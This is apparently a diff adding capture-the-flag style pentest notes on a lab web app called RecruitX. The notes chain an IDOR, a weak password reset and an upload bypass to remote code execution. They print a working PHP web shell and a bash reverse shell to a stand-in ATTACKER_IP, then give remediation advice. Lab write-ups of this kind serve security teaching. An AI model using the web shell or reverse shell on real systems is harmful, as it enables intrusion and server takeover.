@@ -2551,3 +2551,304 @@ Examples:
 * Prepared statements are the best defense.
 * Input validation and sanitization are critical.
 
+Here’s a clean GitHub-style note you can paste into a README or personal cybersecurity notes repo:
+
+# Web Application Pentest Notes — RecruitX
+
+## Overview
+
+This exercise simulated a real-world web application penetration test against a recruitment platform called **RecruitX**.
+
+The goal was to move from:
+
+* Reconnaissance
+* User enumeration
+* Account takeover
+* Admin access
+* Remote Code Execution (RCE)
+
+This room demonstrated how multiple medium-severity vulnerabilities can be chained together into a full server compromise.
+
+---
+
+# Reconnaissance & Enumeration
+
+## Nmap Scan
+
+```bash
+nmap -sV -sC -p- MACHINE_IP
+```
+
+### Open Ports
+
+| Port | Service             |
+| ---- | ------------------- |
+| 22   | SSH                 |
+| 80   | Apache HTTP         |
+| 3306 | MySQL               |
+| 8080 | Apache Default Page |
+
+### Technology Stack
+
+* Apache 2.4.58
+* PHP
+* MySQL
+* Ubuntu Linux
+
+---
+
+# Directory Enumeration
+
+## Gobuster
+
+```bash
+gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
+```
+
+## Interesting Endpoints
+
+```text
+/admin
+/api
+/reset.php
+/uploads
+/profile.php
+/dashboard.php
+```
+
+---
+
+# IDOR Vulnerability
+
+## Vulnerable Endpoint
+
+```text
+/profile.php?id=6
+```
+
+Changing the `id` parameter exposed profiles of other users.
+
+## API Enumeration
+
+```bash
+curl http://MACHINE_IP/api/user?id=1
+```
+
+### Response
+
+```json
+{
+  "name":"Sarah Mitchell",
+  "role":"administrator"
+}
+```
+
+## Impact
+
+* User enumeration
+* Email disclosure
+* Role disclosure
+* Admin discovery
+
+---
+
+# Weak Password Reset
+
+## Vulnerable Page
+
+```text
+/reset.php
+```
+
+## Findings
+
+* Reset token displayed directly in response
+* 6-digit numeric token
+* No rate limiting
+
+### Example Tokens
+
+```text
+784512
+291037
+503648
+```
+
+## Account Takeover
+
+Used the discovered admin email:
+
+```text
+s.mitchell@recruitx.thm
+```
+
+Reset the administrator password successfully.
+
+---
+
+# Admin Panel Access
+
+## Admin Area
+
+```text
+/admin
+```
+
+## File Upload Feature
+
+```text
+/admin/upload.php
+```
+
+Allowed uploads for:
+
+* PDF
+* DOCX
+* Images
+
+But validation was weak.
+
+---
+
+# File Upload Bypass
+
+## Client-Side Restriction
+
+```html
+accept=".pdf,.docx,.jpg"
+```
+
+This only restricted browser selection.
+
+## Upload Tests
+
+### Blocked
+
+```text
+test.php
+test.txt
+```
+
+### Successful
+
+```text
+test.phtml
+```
+
+Apache executed `.phtml` files as PHP.
+
+---
+
+# Remote Code Execution (RCE)
+
+## Web Shell Payload
+
+```php
+<?php
+if(isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
+```
+
+Saved as:
+
+```text
+shell.phtml
+```
+
+Uploaded to:
+
+```text
+/uploads/documents/
+```
+
+---
+
+# Command Execution
+
+## whoami
+
+```bash
+curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=whoami"
+```
+
+### Output
+
+```text
+www-data
+```
+
+---
+
+# Reverse Shell
+
+## Listener
+
+```bash
+nc -lvnp 4444
+```
+
+## Reverse Shell Payload
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+---
+
+# Vulnerability Chain
+
+1. Enumeration
+2. IDOR
+3. Weak Password Reset
+4. Admin Access
+5. File Upload Bypass
+6. Remote Code Execution
+
+---
+
+# Key Lessons Learned
+
+## Enumeration Is Critical
+
+Always map:
+
+* Directories
+* APIs
+* Headers
+* Hidden endpoints
+
+---
+
+## Client-Side Validation ≠ Security
+
+HTML restrictions can always be bypassed.
+
+Server-side validation is mandatory.
+
+---
+
+## Small Vulnerabilities Chain Together
+
+None of these bugs alone caused total compromise.
+
+Combined together:
+→ Full server takeover.
+
+---
+
+# Remediation Recommendations
+
+| Vulnerability      | Fix                                      |
+| ------------------ | ---------------------------------------- |
+| IDOR               | Add server-side authorization            |
+| Weak Reset Tokens  | Use long cryptographically secure tokens |
+| Token Disclosure   | Send reset links only via email          |
+| Upload Bypass      | Use allowlists + MIME validation         |
+| Executable Uploads | Store uploads outside web root           |
+| API Enumeration    | Restrict API access                      |
+
+---
+
+
